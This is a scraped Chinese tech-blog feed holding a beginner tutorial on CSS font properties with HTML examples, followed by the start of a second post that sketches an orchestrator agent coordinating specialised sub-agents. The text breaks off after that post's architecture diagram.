            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/687651121011707/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GinoWi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:15:52.000Z" title="Wed Jan 21 2026 09:15:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CSS属性 - 文字相关属性</h2>
<h4 data-id="heading-1">规定文字样式属性</h4>
<ul>
<li>
<p>格式：<code>font-style: italic;</code></p>
</li>
<li>
<p>取值：</p>
<ul>
<li><code>normal</code>：正常的，默认取值</li>
<li><code>italic</code>：倾斜</li>
</ul>
</li>
<li>
<p>快捷键：</p>
<ul>
<li>输入<code>fs</code> +按 <code>tab</code>键：<code>font-style: italic;</code></li>
<li>输入<code>fsn</code> +按 <code>tab</code>键：<code>font-style: normal;</code></li>
</ul>
</li>
<li>
<p>样式效果：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>字体属性训练<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css">
            <span class="hljs-selector-class">.setItalic</span> {
                <span class="hljs-attribute">font-style</span>: italic;
            }
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"non"</span>&gt;</span>纽约<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"setItalic"</span>&gt;</span>纽约<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a8f2c9e0c834facb5ff547a47546ef5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2lub1dp:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769591751&amp;x-signature=rZzsLBI%2BELCZXhUcpGvX2zoD0k4%3D" width="300px" loading="lazy"/>
</li>
</ul>
<h4 data-id="heading-2">规定文字粗细属性</h4>
<ul>
<li>
<p>格式：<code>font-weight: bold;</code></p>
</li>
<li>
<p>取值：</p>
<ul>
<li>
<p>单词：</p>
<ul>
<li><code>bold</code>：加粗</li>
<li><code>bolder</code>：比加粗还要粗</li>
<li><code>lighter</code>：细线，默认取值</li>
</ul>
</li>
<li>
<p>数值：100～900之间整百的数字</p>
</li>
</ul>
</li>
<li>
<p>快捷键：</p>
<ul>
<li>输入<code>fw</code> + 按<code>tab</code>键：<code>font-weight: ;</code></li>
<li>输入<code>fwb</code> + 按<code>tab</code>键：<code>font-weight: bold;</code></li>
<li>输入<code>fwl</code> + 按<code>tab</code>键：<code>font-weight: lighter;</code></li>
<li>输入<code>fwbr</code> + 按<code>tab</code>键：<code>font-weight: bolder;</code></li>
</ul>
</li>
<li>
<p>样式效果：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>字体属性训练<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css">
            <span class="hljs-selector-class">.setBold</span> {
                <span class="hljs-attribute">font-weight</span>: bold;
            }
            <span class="hljs-selector-class">.setBolder</span> {
                <span class="hljs-attribute">font-weight</span>: bolder;
            }
            <span class="hljs-selector-class">.setLighter</span> {
                <span class="hljs-attribute">font-weight</span>: lighter;
            }
            <span class="hljs-selector-class">.setNumber</span> {
                <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">300</span>;
            }
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"non"</span>&gt;</span>纽约<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"setBold"</span>&gt;</span>纽约<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"setBolder"</span>&gt;</span>纽约<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"setLighter"</span>&gt;</span>纽约<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"setNumber"</span>&gt;</span>纽约<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23e520bb61694c6698e3ed7d2bbca780~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2lub1dp:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769591751&amp;x-signature=vJY3eojk329qQG%2BEwB%2BgCK%2FuGug%3D" width="300px" loading="lazy"/>
</li>
</ul>
<blockquote>
<p><em><strong>补充内容：</strong></em></p>
<p>在CSS中，<code>font-weight: bold</code> 和 <code>font-weight: bolder</code> 在视觉上看起来相同，主要原因在于‌<strong>字体的字重（weight）是离散的，而非连续的</strong>‌，并且浏览器会进行‌<strong>最接近的匹配</strong>‌。</p>
<p>具体来说，有以下几点原因：</p>
<ul>
<li>‌**<code>bold</code> 是一个绝对值，对应数字 700**‌。它表示使用字体设计中预设的“粗体”字重版本。</li>
<li>‌**<code>bolder</code> 是一个相对值**‌，它表示“比父元素的字重更粗”。如果父元素的字重是 <code>normal</code>（400），那么 <code>bolder</code> 会将字重设置为 <code>bold</code>（700）。但如果父元素已经是 <code>bold</code>（700），<code>bolder</code> 会尝试设置为下一个更粗的字重（如 800 或 900）。</li>
<li>‌<strong>关键限制在于字体本身</strong>‌：并非所有字体都提供从 100 到 900 的完整字重系列。许多常见字体（如系统默认字体）只提供 <code>normal</code>（400）和 <code>bold</code>（700）两种字重。当浏览器遇到 <code>bolder</code>（如 800 或 900）时，如果该字体没有更粗的版本，浏览器就会‌<strong>回退到可用的最粗字重</strong>‌，也就是 <code>bold</code>（700）。</li>
<li>‌<strong>因此，当父元素已经是 <code>bold</code> 时，<code>bolder</code> 无法显示更粗的效果</strong>‌，因为它没有更粗的字体可用，最终显示效果与 <code>bold</code> 完全一致。</li>
</ul>
<p>简而言之，<code>bold</code> 和 <code>bolder</code> 的语义不同（一个是绝对粗体，一个是相对更粗），但在实际显示中，由于字体字重的限制，<code>bolder</code> 往往无法实现比 <code>bold</code> 更粗的效果，导致两者看起来一模一样。‌</p>
<p>如果希望看到 <code>bolder</code> 的真实效果，需要使用支持更多字重的字体（如 Google Fonts 中的许多现代字体），并在父元素字重为 <code>normal</code> 时应用 <code>bolder</code>。</p>
</blockquote>
<h4 data-id="heading-3">规定文字大小属性</h4>
<ul>
<li>
<p>格式：<code>font-size: 30px;</code></p>
</li>
<li>
<p>单位：px（pixel） 像素</p>
</li>
<li>
<p>注意点：通过<code>font-size</code>设置大小一定要带单位，也就是一定要写px。</p>
</li>
<li>
<p>快捷键：输入<code>fz</code> + 按<code>tab</code>键：<code>font-size: ;</code></p>
</li>
<li>
<p>样式效果：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>字体属性训练<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css">
            <span class="hljs-selector-class">.set30</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30px</span>;
            }
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"non"</span>&gt;</span>纽约<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"set30"</span>&gt;</span>纽约<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8fe2672e40744af09163de7ceca964db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2lub1dp:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769591751&amp;x-signature=f%2F3lv92p64fDZVErpxvUq2B3XrU%3D" width="300px" loading="lazy"/>
</li>
</ul>
<h4 data-id="heading-4">规定文字字体属性</h4>
<ul>
<li>
<p>格式：<code>font-family: ;</code></p>
</li>
<li>
<p>注意点：</p>
<ul>
<li>如果取值是中文，需要用双引号或者单引号包裹。</li>
<li>设置的字体必须是用户电脑已经安装的字体。</li>
</ul>
</li>
<li>
<p>快捷键：输入<code>ff</code> + 按<code>tab</code>键：<code>font-family: ;</code></p>
</li>
<li>
<p>样式效果：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>字体属性训练<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css">
            <span class="hljs-selector-class">.setArial</span> {
                <span class="hljs-attribute">font-family</span>:<span class="hljs-string">'Arial'</span>;
            }
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"non"</span>&gt;</span>New York<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"setArial"</span>&gt;</span>New York<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04500a01de424dab80b6ac505b1df620~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2lub1dp:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769591751&amp;x-signature=HIkbZFbL9%2FXSc43p5%2BQGk5vYnTk%3D" width="300px" loading="lazy"/>
</li>
</ul>
<blockquote>
<p><em><strong>补充内容：</strong></em></p>
<ul>
<li>
<p>如果设置字体不存在，那么系统会使用默认的字体来显示（宋体）。</p>
</li>
<li>
<p>如果设置的字体不存在，而我们又不想用默认的字体来显示怎么办？</p>
<ul>
<li>可以字体设置备选方案，格式：<code>font-family: "字体1", "备选方案1", "备选方案2"...;</code></li>
</ul>
</li>
<li>
<p>如果想给中文和英文分别单独设置字体，怎么办？</p>
<ul>
<li>但凡是中文字体，里面都包含了英文，但凡是英文字体里面没有包含中文。也就是说中文字体可以处理英文，英文字体处理不了中文。</li>
<li>格式：<code>font-family: "英文字体", "中文字体";</code></li>
<li>如果想给界面中的英文单独设置字体，英文字体就必须写在中文字体的前面。</li>
</ul>
</li>
<li>
<p>在开发过程中，最常见的字体有以下几个：</p>
<ul>
<li>中文：宋体、黑体、微软雅黑</li>
<li>英文：Times New Roman、Arial</li>
</ul>
</li>
<li>
<p>并不是名称是英文，就一定是英文字体，因为中文字体都有自己的英文名称，所以是不是中文字体，主要是看能不能处理中文。比如：宋体的英文名称就是SimSun；黑体的英文名称SimHei；微软雅黑的英文名称Microsoft YaHei。</p>
</li>
</ul>
</blockquote>
<h4 data-id="heading-5">文字属性简写：</h4>
<ul>
<li>
<p>简写格式：<code>font: {style} {weight} {size} {family};</code> 例如：<code>font: italic bold 10px "楷体";</code></p>
</li>
<li>
<p>注意点：</p>
<ul>
<li>在这种缩写格式中，<code>weight</code>属性可以省略不写。</li>
<li>在这种缩写格式中，<code>style</code>属性和<code>weight</code>属性位置可以交换。</li>
<li>在这种缩写格式中，<code>size</code>属性不能省略，<code>family</code>属性不能省略。</li>
<li><code>size</code>属性和<code>family</code>属性的位置是不能随便乱放的，<code>size</code>属性一定要写在<code>family</code>属性前面，<code>size</code>属性和<code>family</code>属性必须写在所有属性的最后。</li>
</ul>
</li>
</ul>
<p><strong>参考链接：</strong></p>
<p>W3School官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3school.com.cn%2F" target="_blank" title="https://www.w3school.com.cn/" ref="nofollow noopener noreferrer">www.w3school.com.cn</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[主Agent与多个协同子Agent的方案设计]]></title>    <link>https://juejin.cn/post/7597466318978023458</link>    <guid>https://juejin.cn/post/7597466318978023458</guid>    <pubDate>2026-01-21T09:51:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597466318978023458" data-draft-id="7597623654055772175" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="主Agent与多个协同子Agent的方案设计"/> <meta itemprop="keywords" content="前端,架构"/> <meta itemprop="datePublished" content="2026-01-21T09:51:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sorryhc"/> <meta itemprop="url" content="https://juejin.cn/user/3061476130044487"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            主Agent与多个协同子Agent的方案设计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3061476130044487/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sorryhc
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:51:25.000Z" title="Wed Jan 21 2026 09:51:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>如今的大模型应用架构设计基本都是一个主Agent携带多个子Agent。</p>
<p>主Agent负责调度其他垂类Agent，子Agent负责单一领域的角色，属于垂直域专家。</p>
<p>架构上比较类似这样：</p>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────┐
│                    主 Agent（Orchestrator）              │
│  职责：理解用户意图、分解任务、协调子 Agent、聚合结果   │
└──────────────────────┬──────────────────────────────────┘
                       │
        ┌──────────────┼──────────────┬──────────────┐
        │              │              │              │
        ▼              ▼              ▼              ▼
   ┌────────┐    ┌────────┐    ┌────────┐    ┌────────┐
   │差旅Agent│   │日程Agent│   │支付Agent│   │通知Agent│
   │(Travel)│   │(Calendar)│  │(Payment)│  │(Alert) │
   └────────┘    └────────┘    └────────┘    └────────┘
        │              │              │              │
        └──────────────┴──────────────┴──────────────┘
                       │
        ┌──────────────┼──────────────┐
        │              │              │
        ▼              ▼              ▼
   数据库           API 服务        外部服务
   (DB)          (Flights,        (Payment,
                  Hotels,          Email,
                 Trains)          SMS)

</code></pre>
